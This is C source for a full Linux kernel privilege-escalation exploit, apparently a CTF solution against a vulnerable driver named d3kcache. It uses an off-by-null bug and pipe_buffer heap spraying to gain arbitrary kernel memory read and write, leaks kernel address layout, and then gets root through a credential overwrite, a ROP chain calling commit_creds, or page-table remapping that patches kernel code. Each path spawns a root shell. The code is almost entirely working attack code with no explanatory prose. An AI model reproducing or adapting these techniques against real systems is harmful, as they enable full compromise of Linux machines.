int kcache_alloc(int index, uint32_t size, void *buf) {
    return ioctl(kcache_fd, 0x114, &(kcache_cmd) {index, size, buf});
}

int kcache_write(int index, uint32_t size, void *buf) {
    return ioctl(kcache_fd, 0x514, &(kcache_cmd) {index, size, buf});
}

int kcache_read(int index, uint32_t size, void *buf) {
    return ioctl(kcache_fd, 0x1919, &(kcache_cmd) {index, size, buf});
}

int kcache_free(int index) {
    return ioctl(kcache_fd, 0x810, &(kcache_cmd) {.index=index});
}

#define KCACHE_NUM 0x10
#define KCACHE_SIZE 2048

#define SND_PIPE_BUF_SZ 96
#define TRD_PIPE_BUF_SZ 192

int pipe_fd[PIPE_SPRAY_NUM][2];

struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
} info_pipe_buf, evil_pipe_buf[3];
int orig_pipe_id[2] = {-1, -1};
int victim_pip_id[2] = {-1, -1};
int evil_pipe_id[3] = {-1, -1, -1};
size_t page_offset_base = 0xffff888000000000;
size_t vmemmap_base = 0xffffea0000000000;
size_t kernel_offset;
size_t current_task;
size_t buf[0x1000];

struct page *direct_map_addr_to_page_addr(size_t direct_map_addr) {
    return (struct page *) (vmemmap_base + ((direct_map_addr & (~0xFFF)) - page_offset_base) / 0x1000 * 0x40);
}

ssize_t arbitrary_read_by_pipe(void *page_to_read, void *dst) {
    evil_pipe_buf[0].offset = 0;
    evil_pipe_buf[0].len = 0x1FF8;
    evil_pipe_buf[0].page = page_to_read;

    write(pipe_fd[evil_pipe_id[1]][1], &evil_pipe_buf[2], sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], &evil_pipe_buf[0], sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], &evil_pipe_buf[1], sizeof(info_pipe_buf));
    return read(pipe_fd[evil_pipe_id[0]][0], dst, 0xFFF);
}

ssize_t arbitrary_write_by_pipe(void *page_to_write, void *src, size_t len) {
    evil_pipe_buf[0].offset = 0;
    evil_pipe_buf[0].len = 0;
    evil_pipe_buf[0].page = page_to_write;

    write(pipe_fd[evil_pipe_id[1]][1], &evil_pipe_buf[2], sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], &evil_pipe_buf[0], sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
    write(pipe_fd[evil_pipe_id[2]][1], &evil_pipe_buf[1], sizeof(info_pipe_buf));
    return write(pipe_fd[evil_pipe_id[0]][1], src, len);
}

void first_fengshui(){

    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            perror("[-] failed to create pipe.");
            exit(-1);
        }
    }

    puts("[*] exetend pipe_buffer...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i % 8 == 0) {
            free_page(pgv_8pages_start_idx++);
        }
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            perror("[-] failed to extend pipe.");
            exit(-1);
        }
        if (i == PIPE_SPRAY_NUM / 2) {
            puts("[*] spray vulnerable 2k obj...");
            free_page(pgv_8pages_start_idx++);
            for (int j = 0; j < KCACHE_NUM; j++) {
                kcache_alloc(j, 3, "llk");
            }
            puts("[*] exetend pipe_buffer...");
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        write(pipe_fd[i][1], "llk", 3);
        for (int j = 0; j < 8; j++) {
            write(pipe_fd[i][1], &i, sizeof(int));
        }
    }
}

void first_fengshui_UAF(){

    puts("[*] trigerring cross-cache off-by-null...");
    memset(buf, 0, sizeof(buf)); 
    for (int i = 0; i < KCACHE_NUM; i++) {
        kcache_write(i, KCACHE_SIZE - 3, buf);
    }

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        int nr;
        read(pipe_fd[i][0], buf, 3);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!memcmp(buf, "llk", 3) && nr != i) {
            orig_pipe_id[0] = nr, victim_pip_id[0] = i;
            printf("[+] find victim: %d, orig: %d.\n", victim_pip_id[0], orig_pipe_id[0]);
        }
    }

    if (orig_pipe_id[0] == -1) {
        puts("[-] failed to corrupt pipe_buffer.");
        exit(-1);
    }

    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ / sizeof(struct pipe_buffer));
    write(pipe_fd[victim_pip_id[0]][1], buf, SND_PIPE_BUF_SZ * 2 - 3 - 8 * sizeof(int));

    puts("[*] free original pipe...");
    close(pipe_fd[orig_pipe_id[0]][0]);
    close(pipe_fd[orig_pipe_id[0]][1]);

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pipe_id[0] || i == victim_pip_id[0]) {
            continue;
        }
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            perror("[-] failed to extend pipe.");
            exit(-1);
        }
    }

    read(pipe_fd[victim_pip_id[0]][0], buf, SND_PIPE_BUF_SZ - 3 - sizeof(int));
    read(pipe_fd[victim_pip_id[0]][0], &info_pipe_buf, sizeof(info_pipe_buf));

    qword_dump("leak pipe_buffer", &info_pipe_buf, sizeof(info_pipe_buf));
    kernel_offset = (size_t) info_pipe_buf.ops - 0xffffffff82451b30;
    printf("[+] kernel offset: %p\n", kernel_offset);
}

void second_fengshui(){

    puts("[*] construct a second-level uaf pipe page...");
    write(pipe_fd[victim_pip_id[0]][1], &info_pipe_buf, sizeof(info_pipe_buf));

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        int nr;
        if (i == orig_pipe_id[0] || i == victim_pip_id[0]) {
            continue;
        }
        read(pipe_fd[i][0], &nr, sizeof(nr));
        if (nr >= 0 && nr < PIPE_SPRAY_NUM && i != nr) {
            orig_pipe_id[1] = nr;
            victim_pip_id[1] = i;
            printf("[+] find second-level victim: %d, orig: %d.\n", victim_pip_id[1], orig_pipe_id[1]);
        }
    }
    if (victim_pip_id[1] == -1) {
        puts("[-] failed to corrupt second-level pipe_buffer.");
        exit(-1);
    }
}

void second_fengshui_UAF(){
    size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ / sizeof(struct pipe_buffer));
    write(pipe_fd[victim_pip_id[1]][1], buf, sizeof(info_pipe_buf) - 3 - 8 * sizeof(int));

    puts("[*] free second-level original pipe...");
    close(pipe_fd[orig_pipe_id[1]][0]);
    close(pipe_fd[orig_pipe_id[1]][1]);

    puts("[*] fcntl() to set the pipe_buffer on second-level victim page...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pipe_id[0] || i == orig_pipe_id[1] || i == victim_pip_id[0] || i == victim_pip_id[1]) {
            continue;
        }
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) < 0) {
            perror("[-] failed to extend pipe.");
            exit(-1);
        }
    }
}

void build_self_write_pipe(){
    for (int i = 0; i < 3; i++) {
        puts("[*] hijacking pipe_buffer on page to itself...");
        memcpy(&evil_pipe_buf[i], &info_pipe_buf, sizeof(info_pipe_buf));
        evil_pipe_buf[i].offset = TRD_PIPE_BUF_SZ;
        evil_pipe_buf[i].len = TRD_PIPE_BUF_SZ;
        write(pipe_fd[victim_pip_id[1]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
        write(pipe_fd[victim_pip_id[1]][1], &evil_pipe_buf[i], sizeof(info_pipe_buf));

        for (int j = 0; j < PIPE_SPRAY_NUM; j++) {
            if (j == orig_pipe_id[0] || j == orig_pipe_id[1] || j == victim_pip_id[0] || j == victim_pip_id[1]) {
                continue;
            }
            bool flag = false;
            for (int k = 0; k < i; k++) {
                if (j == evil_pipe_id[k]) {
                    flag = true;
                    break;
                }
            }
            if (flag) {
                continue;
            }
            struct page *page_ptr;
            read(pipe_fd[j][0], &page_ptr, sizeof(page_ptr));
            if (page_ptr == info_pipe_buf.page) {
                evil_pipe_id[i] = j;
                printf("[+] find self-writing pipe: %d\n", evil_pipe_id[i]);
            }
        }
        if (evil_pipe_id[i] == -1) {
            puts("[-] failed to build self-writing pipe.");
            exit(-1);
        }
    }
}
void leak(){
    evil_pipe_buf[1].offset = TRD_PIPE_BUF_SZ * 3;
    evil_pipe_buf[1].len = 0;
    write(pipe_fd[evil_pipe_id[2]][1], &evil_pipe_buf[1], sizeof(info_pipe_buf));

    evil_pipe_buf[2].offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf[2].len = 0;

    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
    while (true) {
        arbitrary_read_by_pipe((void *) vmemmap_base + 0x9d000 / 0x1000 * 0x40, buf);
        if (kernel_offset + 0xFFFFFFFF81000070 == buf[0]) {
            printf("[+] find secondary_startup_64: %p\n", buf[0]);
            break;
        }
        vmemmap_base -= 0x10000000;
    }
    printf("[+] vmemmap_base: %p\n", vmemmap_base);

    puts("[*] seeking task_struct in memory...");
    prctl(PR_SET_NAME, "pwn-llk");
    for (int i = 0;; i++) {
        ssize_t len = arbitrary_read_by_pipe((void *) vmemmap_base + i * 0x40, buf);
        size_t *comm = memmem(buf, len, "pwn-llk", 13);
        if (comm && is_dir_mapping_addr(comm[-2])
            && is_dir_mapping_addr(comm[-57])
            && is_dir_mapping_addr(comm[-56])) {
            current_task = comm[-50] - 2528;
            page_offset_base = (comm[-50] & 0xfffffffffffff000) - i * 0x1000;
            page_offset_base &= 0xfffffffff0000000;
            printf("[+] find currtent task_struct: %p\n", current_task);
            printf("[+] page_offset_base: %p\n", page_offset_base);
            break;
        }
    }
}

void privilege_escalation_by_task_overwrite() {
    /* finding the init_task, the final parent of every task */
    puts("[*] Seeking for init_task...");
    size_t init_cred;
    size_t task = current_task;
    while (true) {
        arbitrary_read_by_pipe(direct_map_addr_to_page_addr(task), buf);
        arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(task) + 0x40, &buf[0x1000 / 8]);
        if ((buf[((task & 0xFFF) + 0x998) / 8] & 0xFFFFFFFF) == 0) {
            init_cred = buf[((task & 0xFFF) + 0xB60) / 8];
            printf("[+] find init_cred: %p\n", init_cred);
            break;
        }
        task = buf[((task & 0xFFF) + 0x8D0) / 8] - 0x8D0;
    }

    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);
    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &buf[0x1000 / 8]);
    buf[((current_task & 0xFFF) + 0xB58) / 8] = init_cred;
    buf[((current_task & 0xFFF) + 0xB60) / 8] = init_cred;
    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(current_task), buf, 0xff0);
    arbitrary_write_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &buf[0x1000 / 8], 0xff0);
    system("/bin/sh");
}

size_t stack_addr, pgd_addr;

void pgd_vaddr_init() {
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);
    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &buf[0x1000 / 8]);
    stack_addr = buf[((current_task & 0xFFF) + 0x20) / 8];
    printf("[*] kernel stack addr: %p\n", stack_addr);
    size_t mm_struct_addr = buf[((current_task & 0xFFF) + 0x920) / 8];
    printf("[*] mm_struct addr: %p\n", mm_struct_addr);
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(mm_struct_addr), buf);
    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(mm_struct_addr) + 0x40, &buf[0x1000 / 8]);
    pgd_addr = buf[((mm_struct_addr & 0xFFF) + 0x48) / 8];
    printf("[*] pgd addr: %p\n", pgd_addr);
}

#define PTE_OFFSET 12
#define PMD_OFFSET 21
#define PUD_OFFSET 30
#define PGD_OFFSET 39

#define PT_ENTRY_MASK 0b111111111UL
#define PTE_MASK (PT_ENTRY_MASK << PTE_OFFSET)
#define PMD_MASK (PT_ENTRY_MASK << PMD_OFFSET)
#define PUD_MASK (PT_ENTRY_MASK << PUD_OFFSET)
#define PGD_MASK (PT_ENTRY_MASK << PGD_OFFSET)

#define PTE_ENTRY(addr) ((addr >> PTE_OFFSET) & PT_ENTRY_MASK)
#define PMD_ENTRY(addr) ((addr >> PMD_OFFSET) & PT_ENTRY_MASK)
#define PUD_ENTRY(addr) ((addr >> PUD_OFFSET) & PT_ENTRY_MASK)
#define PGD_ENTRY(addr) ((addr >> PGD_OFFSET) & PT_ENTRY_MASK)

#define PAGE_RW (1ULL << 1)
#define PAGE_NX (1ULL << 63)

size_t vaddr_to_paddr_for_4_level(size_t vaddr) {
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
    size_t pte_vaddr = ((buf[PMD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);
    return ((buf[PTE_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) | (vaddr & 0xFFF);
}

size_t vaddr_to_paddr_for_3_level(size_t vaddr) {
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
    return ((buf[PMD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) | (vaddr & 0x1FFFFF);
}

void vaddr_remapping(size_t vaddr, size_t paddr) {
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
    size_t pte_vaddr = ((buf[PMD_ENTRY(vaddr)] & (~0xFFF)) & (~PAGE_NX)) + page_offset_base;
    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);
    buf[PTE_ENTRY(vaddr)] = (paddr & (~0xFFF)) | 0x8000000000000867;/* mark it writable */
    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf, 0xff0);
}

void get_shell(void) {
    char *args[] = {"/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);
}

void privilege_escalation_by_rop() {
    pgd_vaddr_init();
    stack_addr = vaddr_to_paddr_for_4_level(stack_addr) + page_offset_base;
    printf("[*] stack addr on direct mapping space: %p\n", stack_addr);
    save_status();
    size_t ret = 0xffffffff8107af08 + kernel_offset;
    size_t pop_rdi_ret = 0xffffffff818710dd + kernel_offset;
    size_t init_cred = 0xFFFFFFFF83079EE8 + kernel_offset;
    size_t commit_creds = 0xFFFFFFFF811284E0 + kernel_offset;
    size_t swapgs_restore_regs_and_return_to_usermode = 0xFFFFFFFF82201A90 + kernel_offset;
    size_t *rop = buf;
    for (int i = 0; i < ((0x1000 - 0x100) / 8); i++) { *rop++ = ret; }
    *rop++ = pop_rdi_ret;
    *rop++ = init_cred;
    *rop++ = commit_creds;
    *rop++ = swapgs_restore_regs_and_return_to_usermode + 0x36;
    rop++;
    rop++;
    *rop++ = (size_t) get_shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;
    puts("[*] hijacking current task's stack...");
    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(stack_addr + 0x1000 * 3), buf, 0xff0);
}

void privilege_escalation_by_usma() {
    pgd_vaddr_init();
    size_t ns_capable_setid_vaddr = 0xFFFFFFFF810FD2A0 + kernel_offset;
    printf("[*] ns_capable_setid vaddr: %p\n", ns_capable_setid_vaddr);
    size_t ns_capable_setid_paddr = vaddr_to_paddr_for_3_level(ns_capable_setid_vaddr);
    printf("[*] ns_capable_setid vaddr in dir map: %p\n", ns_capable_setid_paddr + page_offset_base);
    size_t ns_capable_setid_page_paddr = ns_capable_setid_paddr & ~0xFFF;
    char *code_mmap = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(code_mmap, 0, 0x2000);
    vaddr_remapping((size_t) code_mmap, ns_capable_setid_page_paddr);
    vaddr_remapping((size_t) code_mmap + 0x1000, ns_capable_setid_page_paddr + 0x1000);
    sleep(1);
    byte_dump("code_mmap", code_mmap + (ns_capable_setid_paddr & 0xFFF), 0x100);
    uint8_t shellcode[] = {0x48, 0xc7, 0xc0, 0x1, 0x0, 0x0, 0x0, 0xc3};
    memcpy(code_mmap + (ns_capable_setid_paddr & 0xFFF), shellcode, sizeof(shellcode));
    setresuid(0, 0, 0);
    system("/bin/sh");
}

int main(int argc, char **argv, char **envp)
{
    bind_core(true,false);
    puts("step 1: open /dev/d3kcache ");
    int kcache_fd = open("/dev/d3kcache", O_RDWR);
    puts("step 2: prepare for namespace process and pipe for alloc order page ");
    prepare_pgv_system();
    puts("step 3: setsocket heap spray for contiguous order 3 page   ");
    prepare_pgv_pages();
    puts("step 4: build first page fengshui  ");
    first_fengshui();
    puts("step 5: build pipbuffer page UAF  ");
    first_fengshui_UAF();
    puts("step 6: build second page fengshui ");
    second_fengshui();
    puts("step 7: fill UAF page by pipebuffer and build pipebuffer page UAF  ");
    second_fengshui_UAF();
    puts("step 8: fill UAF page by pipebuffer and build three pipe which their page point to the page they are in");
    build_self_write_pipe();
    puts("step 8: build arbitary read write and leak  page_offset_base and vmemmap_base and  Kernel offset ");
    leak();

    if (argv[1] && !strcmp(argv[1], "rop")) {
        privilege_escalation_by_rop();
    } else if (argv[1] && !strcmp(argv[1], "usma")) {
        privilege_escalation_by_usma();
    } else {
        privilege_escalation_by_task_overwrite();
    }

}
```